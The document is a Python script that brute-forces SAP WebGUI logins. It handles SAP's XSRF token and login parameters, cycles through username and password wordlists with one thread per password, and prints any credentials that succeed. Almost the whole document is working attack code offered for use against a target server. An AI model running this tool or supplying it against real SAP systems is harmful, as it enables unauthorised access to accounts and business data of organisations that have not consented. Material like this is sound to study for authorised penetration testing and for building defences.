#!/usr/bin/env python3

import requests, sys, threading, time, textwrap
from bs4 import BeautifulSoup
from argparse import ArgumentParser

found = ""
banner = """
  ___   _   ___  __      __   _               _   ___          _        __                
 / __| /_\ | _ \ \ \    / /__| |__  __ _ _  _(_) | _ )_ _ _  _| |_ ___ / _|___ _ _ __ ___ 
 \__ \/ _ \|  _/  \ \/\/ / -_) '_ \/ _` | || | | | _ \ '_| || |  _/ -_)  _/ _ \ '_/ _/ -_)
 |___/_/ \_\_|     \_/\_/\___|_.__/\__, |\_,_|_| |___/_|  \_,_|\__\___|_| \___/_| \__\___|
                                   |___/                                                  
"""

def handle_login(URL, CLIENT, SERVER, PORT, SAP_SID, USERNAME, PASSWORD):
    HEADERS = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
            'Referer': URL + '?sap-client=' + CLIENT,
            'Origin': 'http://' + SERVER + ":" + PORT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
    }
    session = requests.session()
    session.get(URL)
    r = session.get(URL, allow_redirects=True)
    soup = BeautifulSoup(r.text, 'lxml')
    csrf_token = soup.select('input', name="sap-login-XSRF")[6]
    XSRF_COOKIE = csrf_token['value']

    PARAMS = {
            'FOCUS_ID': 'sap-user',
            'sap-system-login-oninputprocessing': 'onLogin',
            'sap-urlscheme': '',
            'sap-system-login': 'onLogin',
            'sap-system-login-basic_auth': '',
            'sap-accessibility': '',
            'sap-login-XSRF': XSRF_COOKIE,
            'sap-system-login-cookie_disabled': '',
            'sysid': SAP_SID,
            'sap-client': CLIENT,
            'sap-user': USERNAME,
            'sap-password': PASSWORD,
            'sap-language': 'EN',
            'sap-language-dropdown': 'English'
    }

    r = session.post(URL, headers=HEADERS, data=PARAMS)

    return r.status_code, r.history

def do_bruteforce(URL, CLIENT, SERVER, PORT, SAP_SID, USER_FILE, password):
        for username in USER_FILE:
                username = username.strip("\n")
                ret_code, ret_oldcode = handle_login(URL, CLIENT, SERVER, PORT, SAP_SID, username, password)
                if (ret_code == 200) and (len(ret_oldcode) > 0):
                        print(f"[+] Username/Password found: {username}:{password}\n")
                        global found
                        found = "1"
                        break
                else:
                        None

def parse_options():
    description = "This script does a simple Brute Force attack against SAP WebGUI. For that it can handle the SAP specific 'XSRF' Cookies and Request parameters."
    usage = "%(prog)s [options]"
    parser = ArgumentParser(usage=usage, description=description)
    target = parser.add_argument_group("Target")
    target.add_argument("--sid", dest="SAP_SID", help="SAP System ID", required=True)
    target.add_argument("--target", dest="SERVER", help="IP/Hostname of Target Server", required=True)
    target.add_argument("--port", dest="PORT", help="HTTP Port of Target Server (default: 8000)", default="8000")
    target.add_argument("--client", dest="CLIENT", help="Define the client to login to (default: 001)", default="001")
    target.add_argument("--url", dest="URL_PREFIX", help="Define URL prefix (default: sap/bc/gui/sap/its/webgui)", default="/sap/bc/gui/sap/its/webgui")
    target.add_argument("--user-file", dest="USER_FILE", help="Path to file with usernames (one per line)")
    target.add_argument("--pass-file", dest="PASS_FILE", help="Path to file with password (one per line)")
    options = parser.parse_args()

    return options

def buffer_wordlist(USER_FILE, PASS_FILE):
        user_lst = []
        pw_lst = []
        print("[*] Loading user wordlist...")
        with open(USER_FILE, "r") as usrfile:
                for user in usrfile:
                        user_lst.append(user)
        
        print("[*] Loading password wordlist...")
        with open(PASS_FILE) as pwfile:
                for password in pwfile:
                        pw_lst.append(password)

        return user_lst, pw_lst

def main():
        options = parse_options()
        try:
                URL = "http://" + options.SERVER + ":" + options.PORT + options.URL_PREFIX
                usrfile, pwfile = buffer_wordlist(options.USER_FILE, options.PASS_FILE)
                for password in pwfile:
                        password = password.strip("\n")
                        process = threading.Thread(target=do_bruteforce, args=(URL, options.CLIENT, options.SERVER, options.PORT, options.SAP_SID, usrfile, password,))
                        process.start()       
        except:
                pass

print(banner)
print("CAUTION: SAP allows max. 99 failed logins for a user!")
print("\n")
main()
